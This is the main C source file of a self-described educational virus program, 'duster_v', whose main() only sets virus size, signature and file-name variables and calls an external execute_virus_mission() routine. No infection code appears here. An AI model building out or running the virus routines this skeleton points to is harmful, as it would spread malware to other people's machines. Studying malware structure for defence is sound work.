/*
 * duster_v_main.c
 *
 * Created on: Jan 3, 2022
 * Note: This piece of software is designed only for learning and training purposes.
 * Building a virus program with relatively ease should increase your awareness on system vulnerabilities at all times.
 */

#include "duster_v_main.h"

int main(int argc, char *argv[])
{
	long size_of_virus=VIRUS_SIZE;
	char *signature_of_virus=VIRUS_SIGNATURE;
	char *temporary_file_name=TEMPORARY_FILE_NAME;
	char *binary_file_name=argv[0];

	execute_virus_mission();

	return 0;

}
